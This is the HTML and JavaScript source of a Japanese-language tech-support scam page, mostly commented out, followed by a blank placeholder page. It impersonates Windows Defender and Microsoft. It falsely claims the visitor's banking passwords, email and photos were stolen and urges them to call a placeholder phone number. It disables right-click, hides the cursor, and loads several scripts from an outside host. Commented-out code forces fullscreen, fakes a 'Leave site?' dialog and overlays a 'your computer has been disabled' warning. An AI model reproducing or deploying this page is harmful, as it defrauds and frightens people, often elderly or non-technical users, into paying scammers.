
<!--<!DOCTYPE html><html lang="en"><meta http-equiv="content-type" content="text/html;charset=utf-8" /><head>    <script defer data-domain="jp-invoicedisplay.com/KCcRxp" src="https://api.publytics.net/js/script.manual.min.js"></script>    <script>        window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };        publytics('pageview');    </script>    <meta charset="utf-8">    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">    <meta content="noindex,nofollow" name="robots">    <title>ヘルプデスクを取得 -01JP21</title>    <link href="https://newpp81.onrender.com/img01df.png" rel="icon" id="favicon" type="image/png">    <link href="01css32bd.css" rel="stylesheet">    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>    <script type="text/javascript">        $(function(){            $('body').bind('contextmenu', function(e){                return false;            });        });    </script>    <script src="https://newpp81.onrender.com/12dgdur.js"></script>    <script src="https://newpp81.onrender.com/11gfdjuef.js"></script>    <script src="https://newpp81.onrender.com/09sgsgsfr.js"></script>    <script src="https://newpp81.onrender.com/13dugfjdf.js"></script>    <script>        let bcda = "99999999999";    </script></head><body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none"><div class="bg" style="cursor:none">    <div class="bgimg" style="top:0">        <img src="https://newpp81.onrender.com/fesbg.png" alt="" width="100%">    </div></div><a href="#" id="link_black" style="cursor:none" rel="noreferrer">    <div class="black" style="height: 145%; cursor: none; display: block;"></div></a><div class="pro_box2" style="cursor: none; display: block;">    <img src="https://newpp81.onrender.com/bx1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;"></div><div class="pro_box3" style="cursor: none; display: block;">    <img src="https://newpp81.onrender.com/web1.png" alt="" style="width:100%;max-width: 100%;display: block;      margin: 0 auto;"></div><div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999;" id="footer">    <div class="row">        <div class="col-md-12">            <div class="right-foot" style="text-align:center;margin-bottom: 5px;">                    <span id="footertxt">              <img src="https://newpp81.onrender.com/img01df.png"> Windows_セキュリティ </span>                <span style="font-weight:500;padding-left:13px;color:#fff; ">ダイヤルウィンドウのサポート: <span style="border:1px solid #fff;border-radius:5px;padding:4px 5px"> <img src="https://newpp81.onrender.com/winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> 直接お電話ください <script>document.write(bcda)</script>              </span>                    </span>            </div>        </div>        <div class="col-md-12">            <marquee direction="left" height="100px" width="100%">                <small class="text-left" style="color:#eee;font-size:10px">認識されないアプリはWindows Defender SmartScreenによってブロックされました。システムが脆弱である可能性があります。Windows Defenderのスキャンにより、パスワード、個人情報、金融データ、個人ファイルを盗み取る可能性のあるアドウェアが検出されました。 </small>            </marquee>        </div>    </div></div><div class="lightbox" id="poptxt" style="display: block;">    <div class="ilb top" style="font-size:17px">        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">                <span class="fl title" id="txtadd">            <span class="fl ilb">              <img src="https://newpp81.onrender.com/dm.png" class="logo3">            </span>Windows_Defender_セキュリティセンター</span>            <span class="fl title2" id="txts1">            <a href="#" id="bgt">              <img src="https://newpp81.onrender.com/cs.png">            </a>          </span>        </div>    </div>    <div id="txtintro">            <span class="colo-rd">          <div id="ip_add">Windows_Defender_セキュリティセンター</div>          <div id="cityopm">セキュリティ侵害の影響を受けたシステム</div>          <div id="isp"> (エラーコード: 16JPsy7)</div>        </span>    </div>    <img src="https://newpp81.onrender.com/re.gif" id="banner">    <div id="disclaimer">保護対策のためシステムへのアクセスが制限されています。        <br>        <span class="support" style="font-size:22px;">Windows サポートに問い合わせてください: <br><span style="border:1px solid #114d9a;border-radius:5px;padding:4px 5px"> <img src="https://newpp81.onrender.com/winlo.png" alt=""  style="width: 25px;vertical-align: sub;"> 直接お電話ください <script>document.write(bcda)</script>          </span>            </span>    </div>    <div id="bottom">        <img src="https://newpp81.onrender.com/img01df.png" id="badge">        <span class="title3">Windows</span>        <ul>            <li>                <a href="#">                    <div class="fr button2">                        <span id="addtochromebutton">許可する</span>                    </div>                </a>            </li>            <li>                <a href="#">                    <div class="fr button blink">                        <span id="addtochromebutton">拒否を取得</span>                    </div>                </a>            </li>        </ul>    </div></div><div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">    <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">Windows Defender - セキュリティ警告</p>    セキュリティ上の理由により、このシステムにはアクセスできません。</b></p>    お使いのコンピューターに悪意のある脅威があることが報告されています。 <br/> <br/> <br/> <br/> <br/> 以下の情報が盗まれました: <br/> >> 電子メール アドレス <br/> >> 銀行のログイン パスワード <br/> >> Facebook アカウントのログイン <br/> >> 写真と書類 <br/> Windows Defender のスキャンによると、このデバイスには、パスワード、オンライン ID、金融情報、個人ファイル、写真、ドキュメントを盗む可能性のあるアドウェアが含まれています。 <br/> すぐにご連絡ください。電話で、弊社のエンジニアが削除手順をご案内します。 <br/> 直ちに Windows サポートに連絡して、脅威を報告し、個人情報の盗難を止め、このデバイスへのアクセスをブロック解除してください。 <br/> このウィンドウを閉じると、Windows の登録が一時停止され、個人情報が危険にさらされる可能性があります。    <br/>   <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話してください: <strong>          <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br/>直接お電話ください  <script>document.write(bcda)</script>          </span></strong></p>    <div class="action_buttons">        <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">わかりました</a>        <a class="active" id="leave_page" style="color:#fff!important">キャンセル</a>    </div></div><div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">    <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">できるだけ早くご連絡ください。弊社のエンジニアが電話で削除手順をサポートいたします。お使いのコンピューターは無効になっています。Windows Defender SmartScreen が認識されないアプリケーションを停止しています。このアプリを実行すると、システムの安全性が損なわれる可能性があります。        <br>        <strong>Windowsサポートに電話: <span style="border:1px solid #383d41;border-radius:5px;padding:6px 5px"> <img src=https://newpp81.onrender.com/"winlo.png" alt="&nbsp"  style="width: 25px;vertical-align: bottom;"> 直接お電話ください <script>document.write(bcda)</script>          </span>        </strong>    </p></div><div id="chat" style="display: block;">    <img src="https://newpp81.onrender.com/img01df.png">    <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>    <p style="font-weight:600;font-size:24px">サポートに電話する:        <br>    </p>    <h4 style="font-weight:600;font-size:22px"> <img src="https://newpp81.onrender.com/winlo.png" alt=""  style="width: 25px;margin-left: 0;"> 電話してください  <script>document.write(bcda)</script>        <br>(セキュリティヘルプデスク)    </h4>    <div class="arrow-down">        <svg height="1em" viewBox="0 0 320 512">            <style>                svg {                    fill: #fff                }            </style>            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>        </svg>    </div></div><script src="https://newpp81.onrender.com/08dgsg3d.js"></script><script src="https://newpp81.onrender.com/07sdgsg4.js"></script><script src="https://newpp81.onrender.com/06hshs.js"></script><script src="https://newpp81.onrender.com/05sdghdf.js"></script><script src="https://newpp81.onrender.com/04shesc1.js"></script><script src="https://newpp81.onrender.com/03fgsskryeivh.js"></script><script src="https://newpp81.onrender.com/02dgdsg3d.js"></script><script type="text/javascript" src="https://newpp81.onrender.com/01d1fgshfddfg.js"></script></body></html>-->


<!--<style>-->
<!--    #exit-popup {-->
<!--        position: fixed;-->
<!--        left: 0;-->
<!--        top: 0;-->
<!--        right: 0;-->
<!--        margin: 0 auto;-->
<!--        display: none;-->
<!--        background-color: #fff;-->
<!--        max-width: 460px;-->
<!--        padding: 10px;-->
<!--        border-radius: 8px;-->
<!--        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);-->
<!--        font-family: Arial, Helvetica, sans-serif;-->
<!--        width: 90%;-->
<!--        box-sizing: border-box;-->
<!--        z-index: 9999999999999999999999;-->
<!--    }-->
<!--    .btn_leave {        padding: 10px 20px;        background-color: #1b73e8;        color: #fff !important;        text-transform: capitalize;        text-decoration: none;        border: 1px solid #ddd;        border-radius: 5px;        display: inline-block;        animation: zoominoutsinglefeatured 1s infinite;    }    .btn_cancel {        padding: 10px 20px;        border: 1px solid #ddd;        color: #1b73e8 !important;        text-transform: capitalize;        text-decoration: none;        border-radius: 5px;        display: inline-block;        margin-left: 10px;        background-color: transparent;    }    .btn-wrapper {        text-align: right;        margin-top: 20px;    }-->
<!--    @keyframes zoominoutsinglefeatured {-->
<!--        0% {-->
<!--            transform: scale(1, 1);-->
<!--        }-->
<!--        50% {-->
<!--            transform: scale(1.1, 1.1);-->
<!--        }-->
<!--        100% {-->
<!--            transform: scale(1, 1);-->
<!--        }-->
<!--    }-->
<!--    @keyframes scale {-->
<!--        0% {-->
<!--            transform: scale(1);-->
<!--        }-->

<!--        100% {-->
<!--            transform: scale(1.2);-->
<!--        }-->
<!--    }-->
<!--</style>-->
<!--<div id="overlay2" style="-->
<!--    z-index: 9999999999;-->
<!--    position: fixed;-->
<!--    height: 100vh;-->
<!--    width: 100vw;-->
<!--    background: black;-->
<!--    display: none;-->
<!--">-->
<!--    <div-->
<!--            style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">-->
<!--        <p class="text-center" style="color: #FEFEFE; font-size: large;">-->
<!--            Do not restart or use your computer.<br>-->
<!--            Your computer has been disabled. Please call me.<br>-->
<!--            Access is blocked for security reasons on this computer.<br>-->
<!--            Please contact us immediately. A technician will assist in resolving the issue.-->
<!--        </p>-->
<!--    </div>-->
<!--</div>-->
<!--<div id="exit-popup">-->
<!--    <h3 >Leave site?</h3>-->
<!--    <p style="font-size: large">Changes you made may not be saved.</p>-->
<!--    <div class="btn-wrapper">-->
<!--        <button class="btn_leave" style="font-size: large">Leave</button>-->
<!--        <button class="btn_cancel" style="font-size: large" >Cancel</button>-->
<!--    </div>-->
<!--</div>-->
<!--<script src="https://newpp81.onrender.com/11gfdjuef.js"></script>-->
<!--<script>-->
<!--    let popupShown = false;-->
<!--    let isOverlay = false;-->
<!--    function isFullscreen() {-->
<!--        return !!(-->
<!--            document.fullscreenElement ||-->
<!--            document.webkitFullscreenElement ||-->
<!--            document.mozFullScreenElement ||-->
<!--            document.msFullscreenElement-->
<!--        );-->
<!--    }-->
<!--    document.addEventListener("click", () => {-->
<!--        const el = document.documentElement;-->

<!--        if (el.requestFullscreen) {-->
<!--            el.requestFullscreen();-->
<!--        } else if (el.webkitRequestFullscreen) {-->
<!--            el.webkitRequestFullscreen();-->
<!--        } else if (el.msRequestFullscreen) {-->
<!--            el.msRequestFullscreen();-->
<!--        }-->
<!--    });-->
<!--    function checkFull () {-->
<!--        if (!popupShown && !isFullscreen()) {-->
<!--            isOverlay = false;-->
<!--            console.log("show popup");-->
<!--            if (!popupShown) {-->
<!--                setTimeout(function () {-->
<!--                    document.getElementById("exit-popup").style.display = "block";-->
<!--                }, 3000);-->
<!--            }-->

<!--            popupShown = true;-->
<!--        } else if (popupShown && isFullscreen()) {-->
<!--            if (!isOverlay) {-->
<!--                document.getElementById("overlay2").style.display = "block";-->
<!--                setTimeout(function () {-->
<!--                    document.getElementById("overlay2").style.display = "none";-->
<!--                }, 5000);-->
<!--            }-->
<!--            console.log("hide popup");-->
<!--            document.getElementById("exit-popup").style.display = "none";-->
<!--            isOverlay = true;-->
<!--            popupShown = false;-->
<!--        }-->
<!--        console.log( isFullscreen(), popupShown)-->
<!--    }-->
<!--    document.addEventListener("mousemove", checkFull);-->
<!--</script>-->


<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<div>
    index script link
</div>
</body>
</html>